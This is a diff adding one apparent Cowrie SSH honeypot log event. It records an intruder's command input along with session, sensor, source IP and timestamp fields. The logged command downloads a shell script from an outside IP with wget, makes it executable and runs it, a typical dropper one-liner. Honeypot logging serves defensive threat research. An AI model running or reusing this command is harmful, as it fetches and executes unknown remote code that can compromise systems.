@@ -1,0 +1,11 @@
+{
+"eventid":"cowrie.command.input",
+"input":"cd /tmp; wget http://100.76.84.112/ur0a.sh; chmod 777 ur0a.sh; ./ur0a.sh cisco",
+"message":"CMD: cd /tmp; wget http://100.76.84.112/ur0a.sh; chmod 777 ur0a.sh; ./ur0a.sh cisco",
+"sensor":"1d5da8138576",
+"uuid":"d64dce96-e4a4-11f0-ba9a-a6b6eec8e0ac",
+"timestamp":"2026-02-11T04:16:18.645630Z",
+"src_ip":"172.212.171.146",
+"session":"a00038542442",
+"protocol":"ssh"
+}
